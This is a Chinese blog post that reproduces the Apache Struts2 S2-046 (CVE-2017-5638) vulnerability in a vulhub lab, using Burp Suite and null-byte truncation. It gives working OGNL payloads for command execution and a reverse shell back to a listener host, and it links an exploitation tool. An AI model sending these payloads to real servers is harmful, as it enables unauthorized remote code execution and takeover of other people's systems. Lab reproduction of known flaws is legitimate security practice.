# CVE-2017-5638 S2-046 复现 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15652512.html`](https://www.cnblogs.com/peace-and-romance/p/15652512.html)

### 0X00-引言

* * *

《大雨还在下》--高夫，MV 非常有魅力，那慢摇的动作，wc，我什么时候可以这么帅，淦

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

工具：burpsuite

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-漏洞介绍

* * *

This is a different vector for the same vulnerability described in S2-045 (CVE-2017-5638).

相同的漏洞，不同的向量。和 S2-045 一样原理，利用的字段和方式有点区别

影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10

### 0X03-漏洞复现

* * *

打开靶场-burpsuite 抓包

![image-20211206094706232](img/45c7e24d45c0ec299e5a553f4f8ea7eb.png)

![image-20211206095006656](img/8f7bfaf026af4f24397967f389bcbafa.png)

##### 01-命令执行

POC:

```
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',1+99)}\xb 
```

最后 b 之前 00 截断

使用 burpsuite 进行 00 截断

![image-20211206095724320](img/9af041931531f0f8c344e0299f8a1328.png)

b 之前点击一下空格，选中空格

![image-20211206095924389](img/400cfe3fd242bf9d8fb47c3ff1a1822b.png)

20 改成 00

![image-20211206100016173](img/3087f212fbcf7ea8f3f27d50418964a8.png)

发送到 repeater 发送

![image-20211206100403053](img/9f3d6ee6fb7ec0dd1a54d2ef0b2b1f41.png)

POC2:

```
%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}b 
```

操作同上

![image-20211206103847968](img/ba2c9510ab852501169d24bc5aa59cb9.png)

##### 02-反弹 shell

POC：注意 IP 和 port 要更改为监听主机的 IP 和 port

```
%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i >& /dev/tcp/ip/port 0>&1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}b 
```

b 之前 00 截断，操作同上

先打开监听

![image-20211206105614553](img/65bfaf386cdb2a47f1caadff0030c835.png)

然后 burpsuite 发送修改后的数据包

![image-20211206105854211](img/38a587d54aaa716010378f5f043bafd8.png)

监听成功

![image-20211206105937996](img/82603c2441964259727988e4549b0e68.png)

### 0X04-漏洞分析

* * *

略

### 0X05-工具利用

* * *

工具地址：[`github.com/Liqunkit/LiqunKit_`](https://github.com/Liqunkit/LiqunKit_)

![image-20211206110328843](img/a7a2e43f0fa61f658d09e4f22c1b24db.png)

![image-20211206110413662](img/984736b2bbdf7c81ace91787533762ee.png)

### 0X06-参考

* * *

[S2-046 远程代码执行漏洞（CVE-2017-5638）](https://www.pianshen.com/article/73361111474/)

[S2-046 分析(CVE-2017-5638)](https://www.angelwhu.com/paper/2017/03/21/s2046-analysis-cve20175638/#0x00-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B)

[S2-046 远程代码执行漏洞（CVE-2017-5638）](https://github.com/vulhub/vulhub/blob/master/struts2/s2-046/README.zh-cn.md)